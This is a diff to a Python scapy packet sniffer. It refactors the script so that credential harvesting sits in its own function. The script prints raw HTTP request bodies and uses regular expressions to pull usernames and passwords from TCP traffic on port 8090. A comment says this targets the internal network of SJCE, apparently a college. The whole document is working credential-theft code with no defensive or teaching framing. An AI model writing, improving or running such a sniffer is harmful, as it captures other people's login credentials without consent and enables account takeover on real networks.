@@ -3,7 +3,6 @@ from scapy.layers import http
 import argparse
 import re
 
-login_credentials = {}
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -23,7 +22,12 @@ def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
             print(packet[scapy.Raw].load)
+    login_credentials = get_login_credentials(packet)
+    if login_credentials:
+        print(login_credentials)
 
+def get_login_credentials(packet):
+    login_credentials = {}
     # Checks the TCP layer for any raw data, as in the case for the internal network of SJCE
     if packet.haslayer(scapy.TCP):
         if packet[scapy.TCP].dport == 8090:
@@ -34,8 +38,7 @@ def process_sniffed_packet(packet):
                     password = re.findall(r"password=([^&]+)", str(load))
                     if username[0] not in login_credentials.keys():
                         login_credentials[username[0]] = password[0]
-                        print(login_credentials)
-
+                        return login_credentials
 
 options = get_arguments()
 
